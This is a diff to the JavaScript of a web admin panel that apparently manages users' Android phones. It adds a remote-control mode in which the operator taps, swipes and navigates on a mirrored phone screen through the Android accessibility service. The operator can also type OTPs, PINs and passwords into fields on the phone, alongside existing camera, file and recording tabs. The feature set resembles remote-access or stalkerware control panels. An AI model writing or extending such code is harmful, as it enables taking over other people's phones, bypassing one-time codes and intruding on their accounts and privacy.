@@ -47,6 +47,12 @@ let userDetailCache = null;
 let exploreCtx = null;
 /** @type {string} */
 let activePhoneTab = "camera";
+/** @type {boolean} */
+let adminRcSessionActive = false;
+/** @type {{ nx: number, ny: number } | null} */
+let adminRcDragStart = null;
+/** @type {number} */
+let adminRcLastClickAt = 0;
 
 function show(el, on) {
   if (!el) return;
@@ -1062,17 +1068,288 @@ function renderFilesPanel() {
     .join("")}</ul>`;
 }
 
+function setAdminRcStatus(text) {
+  const el = document.getElementById("admin-rc-status");
+  if (el) el.textContent = text;
+}
+
+function isAdminRcEnabled() {
+  return Boolean(document.getElementById("admin-rc-control-enabled")?.checked) && adminRcSessionActive;
+}
+
+function adminVideoContentRect(video) {
+  const rect = video.getBoundingClientRect();
+  const vw = video.videoWidth || 0;
+  const vh = video.videoHeight || 0;
+  if (!vw || !vh || !rect.width || !rect.height) return null;
+  const scale = Math.min(rect.width / vw, rect.height / vh);
+  const dispW = vw * scale;
+  const dispH = vh * scale;
+  const offX = (rect.width - dispW) / 2;
+  const offY = (rect.height - dispH) / 2;
+  return { rect, vw, vh, scale, dispW, dispH, offX, offY };
+}
+
+function adminClientToNormalized(video, clientX, clientY) {
+  const c = adminVideoContentRect(video);
+  if (!c) return null;
+  const localX = clientX - c.rect.left - c.offX;
+  const localY = clientY - c.rect.top - c.offY;
+  if (localX < 0 || localY < 0 || localX > c.dispW || localY > c.dispH) return null;
+  return {
+    nx: Math.min(1, Math.max(0, localX / c.dispW)),
+    ny: Math.min(1, Math.max(0, localY / c.dispH)),
+    markerX: c.offX + localX,
+    markerY: c.offY + localY,
+  };
+}
+
+function showAdminRcMarker(x, y, ok) {
+  const marker = document.getElementById("admin-rc-touch-marker");
+  if (!marker) return;
+  marker.hidden = false;
+  marker.style.left = `${x}px`;
+  marker.style.top = `${y}px`;
+  marker.style.background = ok === false ? "rgba(220,38,38,0.55)" : "rgba(91,92,226,0.55)";
+  clearTimeout(showAdminRcMarker._t);
+  showAdminRcMarker._t = setTimeout(() => {
+    marker.hidden = true;
+  }, 650);
+}
+
+async function sendAdminA11yCommand(action, payload = {}, opts = {}) {
+  if (!exploreCtx) throw new Error("Select a device first");
+  const video = document.getElementById("admin-screen-video");
+  const videoMeta = {
+    videoWidth: Number(video?.videoWidth || 0),
+    videoHeight: Number(video?.videoHeight || 0),
+  };
+  const wait = opts.wait !== false;
+  const body = {
+    action,
+    payload: {
+      ...payload,
+      ...videoMeta,
+      clientId: "platform_admin",
+      normalized: true,
+    },
+    wait,
+    waitMs: opts.waitMs || (wait ? 20000 : undefined),
+  };
+  const result = await api(
+    `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/command`,
+    { method: "POST", body: JSON.stringify(body) }
+  );
+  return result?.command || result;
+}
+
+async function startAdminRemoteControlSession() {
+  setAdminRcStatus("Starting…");
+  try {
+    await sendAdminA11yCommand("A11Y_START_SESSION", { durationMs: 30 * 60 * 1000 }, { wait: true });
+    adminRcSessionActive = true;
+    setAdminRcStatus("Remote control active");
+  } catch (e) {
+    adminRcSessionActive = false;
+    const box = document.getElementById("admin-rc-control-enabled");
+    if (box) box.checked = false;
+    const msg = e instanceof Error ? e.message : String(e);
+    setAdminRcStatus("Remote control disabled");
+    if (/ACCESSIBILITY_REQUIRED|MODULE_DISABLED/i.test(msg) || e.code === "ACCESSIBILITY_REQUIRED") {
+      alert(
+        "Accessibility control is disabled on the phone.\n\n" +
+          "1) Phone → Management → Remote Control Setup\n" +
+          "2) Enable the Accessibility service in Android Settings\n" +
+          "3) Turn Remote Control ON in the app\n\n" +
+          msg
+      );
+    } else {
+      alert(msg);
+    }
+  }
+}
+
+async function stopAdminRemoteControlSession(emergency) {
+  try {
+    await sendAdminA11yCommand(
+      emergency ? "A11Y_EMERGENCY_STOP" : "A11Y_STOP_SESSION",
+      {},
+      { wait: true, waitMs: 12000 }
+    );
+  } catch {
+    /* ignore */
+  }
+  adminRcSessionActive = false;
+  setAdminRcStatus("View only");
+}
+
+function wireAdminRemoteControl() {
+  const video = document.getElementById("admin-screen-video");
+  const toggle = document.getElementById("admin-rc-control-enabled");
+  toggle?.addEventListener("change", async () => {
+    if (toggle.checked) await startAdminRemoteControlSession();
+    else await stopAdminRemoteControlSession(false);
+  });
+  const nav = (action, label) =>
+    sendAdminA11yCommand("A11Y_GLOBAL_ACTION", { action }, { wait: true, waitMs: 12000 })
+      .then(() => setAdminRcStatus(label))
+      .catch((e) => setAdminRcStatus(e.message || String(e)));
+  document.getElementById("btn-admin-rc-back")?.addEventListener("click", () => nav(1, "Back"));
+  document.getElementById("btn-admin-rc-home")?.addEventListener("click", () => nav(2, "Home"));
+  document.getElementById("btn-admin-rc-recents")?.addEventListener("click", () => nav(3, "Recents"));
+  document.getElementById("btn-admin-rc-notif")?.addEventListener("click", () => nav(4, "Notifications"));
+  document.getElementById("btn-admin-rc-stop")?.addEventListener("click", async () => {
+    if (toggle) toggle.checked = false;
+    await stopAdminRemoteControlSession(true);
+  });
+  document.getElementById("btn-admin-rc-set-text")?.addEventListener("click", async () => {
+    const text = document.getElementById("admin-rc-text-input")?.value || "";
+    try {
+      await sendAdminA11yCommand("A11Y_SET_TEXT", { text }, { wait: true });
+      setAdminRcStatus("Text / password inserted");
+      const input = document.getElementById("admin-rc-text-input");
+      if (input) input.value = "";
+    } catch (e) {
+      setAdminRcStatus(e instanceof Error ? e.message : String(e));
+    }
+  });
+  document.getElementById("btn-admin-rc-clear-text")?.addEventListener("click", async () => {
+    try {
+      await sendAdminA11yCommand("A11Y_SET_TEXT", { text: "" }, { wait: true });
+      setAdminRcStatus("Field cleared");
+    } catch (e) {
+      setAdminRcStatus(e instanceof Error ? e.message : String(e));
+    }
+  });
+  document.getElementById("admin-rc-text-show")?.addEventListener("change", (ev) => {
+    const input = document.getElementById("admin-rc-text-input");
+    if (!input) return;
+    input.type = ev.target?.checked ? "text" : "password";
+  });
+
+  if (!video) return;
+
+  video.addEventListener("pointerdown", (ev) => {
+    if (!isAdminRcEnabled()) return;
+    const mode = document.getElementById("admin-rc-gesture-mode")?.value || "tap";
+    if (mode === "swipe" || mode === "drag") {
+      const p = adminClientToNormalized(video, ev.clientX, ev.clientY);
+      if (!p) return;
+      adminRcDragStart = p;
+      video.setPointerCapture?.(ev.pointerId);
+    }
+  });
+
+  video.addEventListener("pointerup", async (ev) => {
+    if (!isAdminRcEnabled()) return;
+    const mode = document.getElementById("admin-rc-gesture-mode")?.value || "tap";
+    const end = adminClientToNormalized(video, ev.clientX, ev.clientY);
+    if (!end) return;
+    showAdminRcMarker(end.markerX, end.markerY, true);
+    try {
+      if ((mode === "swipe" || mode === "drag") && adminRcDragStart) {
+        const dx = Math.abs(end.nx - adminRcDragStart.nx);
+        const dy = Math.abs(end.ny - adminRcDragStart.ny);
+        if (dx < 0.025 && dy < 0.025) {
+          setAdminRcStatus("Tap…");
+          await sendAdminA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+          setAdminRcStatus("Tap sent");
+          adminRcDragStart = null;
+          return;
+        }
+        setAdminRcStatus(mode === "drag" ? "Dragging…" : "Swiping…");
+        await sendAdminA11yCommand(
+          mode === "drag" ? "A11Y_DRAG" : "A11Y_SWIPE",
+          {
+            nx1: adminRcDragStart.nx,
+            ny1: adminRcDragStart.ny,
+            nx2: end.nx,
+            ny2: end.ny,
+            durationMs: mode === "drag" ? 400 : 250,
+          },
+          { wait: false }
+        );
+        setAdminRcStatus("Gesture ok");
+        adminRcDragStart = null;
+        return;
+      }
+      const now = Date.now();
+      if (mode === "double" || (mode === "tap" && now - adminRcLastClickAt < 280)) {
+        setAdminRcStatus("Double tap…");
+        await sendAdminA11yCommand("A11Y_DOUBLE_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+      } else if (mode === "long" || ev.button === 2) {
+        setAdminRcStatus("Long press…");
+        await sendAdminA11yCommand(
+          "A11Y_LONG_PRESS",
+          { nx: end.nx, ny: end.ny, durationMs: 700 },
+          { wait: false }
+        );
+      } else {
+        setAdminRcStatus("Tap…");
+        await sendAdminA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+      }
+      adminRcLastClickAt = now;
+      setAdminRcStatus("Tap sent");
+    } catch (e) {
+      showAdminRcMarker(end.markerX, end.markerY, false);
+      setAdminRcStatus(e instanceof Error ? e.message : String(e));
+    } finally {
+      adminRcDragStart = null;
+    }
+  });
+
+  video.addEventListener("contextmenu", (ev) => {
+    if (isAdminRcEnabled()) ev.preventDefault();
+  });
+}
+
 function renderScreenPanel() {
   const el = document.getElementById("admin-screen-body");
   if (!el || !exploreCtx) return;
+  adminRcSessionActive = false;
+  adminRcDragStart = null;
   el.innerHTML = `
-    <p class="muted">Starts screen mirror via Platform Admin. Android will show the system cast dialog on the phone.</p>
+    <p class="muted">Screen mirror needs Android system cast consent on the phone. Starts via Platform Admin.</p>
     <div class="connect-actions" style="margin-top:12px;">
       <button type="button" class="btn-primary" id="btn-admin-screen-start">Start screen mirror</button>
       <button type="button" class="btn-danger" id="btn-admin-screen-stop">Stop</button>
     </div>
+    <div class="admin-rc-toolbar surface" style="padding:10px 12px;">
+      <label class="chk"><input type="checkbox" id="admin-rc-control-enabled" /> Remote Control</label>
+      <select id="admin-rc-gesture-mode" class="input" title="Gesture mode">
+        <option value="tap" selected>Tap</option>
+        <option value="double">Double tap</option>
+        <option value="long">Long press</option>
+        <option value="swipe">Swipe</option>
+        <option value="drag">Drag</option>
+      </select>
+      <button type="button" class="btn-secondary" id="btn-admin-rc-back">Back</button>
+      <button type="button" class="btn-secondary" id="btn-admin-rc-home">Home</button>
+      <button type="button" class="btn-secondary" id="btn-admin-rc-recents">Recents</button>
+      <button type="button" class="btn-secondary" id="btn-admin-rc-notif">Notifications</button>
+      <button type="button" class="btn-danger" id="btn-admin-rc-stop">Emergency Stop</button>
+      <span id="admin-rc-status" class="status-badge">View only</span>
+    </div>
     <p id="screen-live-status" class="muted" style="margin-top:10px;" aria-live="polite"></p>
-    <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted controls hidden></video>
+    <div class="admin-screen-stage" id="admin-screen-stage">
+      <video id="admin-screen-video" class="admin-live-video" autoplay playsinline muted controls hidden></video>
+      <div id="admin-rc-touch-marker" hidden></div>
+    </div>
+    <div class="admin-rc-text-panel">
+      <label>Type on phone (OTP, PIN, passwords)
+        <input id="admin-rc-text-input" class="input" type="password" maxlength="2000" placeholder="OTP, PIN, or password for focused field" autocomplete="off" />
+      </label>
+      <label class="chk" style="margin-top:8px;display:flex;align-items:center;gap:8px">
+        <input type="checkbox" id="admin-rc-text-show" /> Show typed characters
+      </label>
+      <div class="row-gap">
+        <button type="button" class="btn-primary" id="btn-admin-rc-set-text">Insert text</button>
+        <button type="button" class="btn-secondary" id="btn-admin-rc-clear-text">Clear field</button>
+      </div>
+      <p class="muted" style="margin:8px 0 0;font-size:0.82rem">
+        Enable Remote Control, tap the field on the mirrored screen, then Insert.
+      </p>
+    </div>
   `;
   document.getElementById("btn-admin-screen-start")?.addEventListener("click", () => {
     void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, ["screenMirror"], false, "auto", {
@@ -1081,12 +1358,16 @@ function renderScreenPanel() {
     });
   });
   document.getElementById("btn-admin-screen-stop")?.addEventListener("click", async () => {
+    if (adminRcSessionActive) await stopAdminRemoteControlSession(false);
+    const box = document.getElementById("admin-rc-control-enabled");
+    if (box) box.checked = false;
     await stopLiveViewer();
     const st = document.getElementById("screen-live-status");
     if (st) st.textContent = "Screen mirror stopped.";
     const v = document.getElementById("admin-screen-video");
     if (v) v.hidden = true;
   });
+  wireAdminRemoteControl();
 }
 
 function renderRecordingPanel() {
